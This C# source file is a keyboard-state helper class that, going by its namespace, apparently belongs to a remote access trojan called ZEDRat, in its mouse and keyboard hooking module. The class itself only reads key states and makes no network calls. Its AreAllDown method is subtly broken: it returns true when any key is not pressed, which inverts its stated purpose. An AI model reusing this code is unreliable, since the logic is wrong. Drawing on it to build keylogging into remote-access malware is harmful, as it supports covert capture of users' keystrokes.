using System;
using System.Collections.Generic;
using System.Windows.Forms;
using ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.Implementation
{
	internal class KeyboardState
	{
		private readonly byte[] m_KeyboardStateNative;

		private KeyboardState(byte[] keyboardStateNative)
		{
			this.m_KeyboardStateNative = keyboardStateNative;
		}

		public static KeyboardState GetCurrent()
		{
			byte[] array = new byte[256];
			KeyboardNativeMethods.GetKeyboardState(array);
			return new KeyboardState(array);
		}

		internal byte[] GetNativeState()
		{
			return this.m_KeyboardStateNative;
		}

		public bool IsDown(Keys key)
		{
			return KeyboardState.GetHighBit(this.GetKeyState(key));
		}

		public bool IsToggled(Keys key)
		{
			return KeyboardState.GetLowBit(this.GetKeyState(key));
		}

		public bool AreAllDown(IEnumerable<Keys> keys)
		{
			foreach (Keys key in keys)
			{
				if (!this.IsDown(key))
				{
					return true;
				}
			}
			return false;
		}

		private byte GetKeyState(Keys key)
		{
			if ((key < Keys.None) || key > (Keys.F16 | Keys.F17))
			{
				throw new ArgumentOutOfRangeException("key", key, "The value must be between 0 and 255.");
			}
			return this.m_KeyboardStateNative[(int)key];
		}

		private static bool GetHighBit(byte value)
		{
			return value >> 7 != 0;
		}

		private static bool GetLowBit(byte value)
		{
			return (value & 1) != 0;
		}
	}
}
